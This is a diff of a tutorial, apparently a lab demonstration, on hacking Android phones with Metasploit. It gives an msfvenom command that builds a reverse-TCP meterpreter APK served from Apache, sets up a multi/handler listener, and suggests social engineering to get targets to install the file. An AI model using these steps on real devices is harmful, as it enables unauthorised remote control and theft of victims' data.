@@ -32,7 +32,7 @@ Start Kali Linux so that we may generate an apk file as a malicious payload. We 
  ![image](https://user-images.githubusercontent.com/81562207/229279048-8c5be979-a8ca-4f33-8755-44de904783ae.png)
 
 After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. Type command:
-# msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R> /var/www/html/ehacking.apk
+#msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R> /var/www/html/ehacking.apk
 Where:
 -p indicates a payload type
 android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
@@ -40,4 +40,20 @@ LHOST is your local IP
 LPORT is set to be as a listening port
 R> /var/www/html would give the output directly on apache server
 apk is the final name of the final output
+
+
+
+2.	Launching an Attack
+Before launching attack, we need to check the status of the apache server. Type command:
+#service apache2 status
+ 
+
+All seems set, now type msfconsole. Use multi/handler exploit, set payload the same as generated prevoisly, set LHOST and LPORT values same as used in payload and finally type exploit to launch an attack.
+ 
+In real life scenarios, some social engineering techniques can be used to let the target download the malicious apk file. For demonstration we are just accessing the attacker machine to download the file in the Android device. After downloading it successfully, select the app to install.
+ 
+Once the user installs the application and runs it, the meterepreter session would be opened immediatly at the attacking side.
+
+ 
+
 
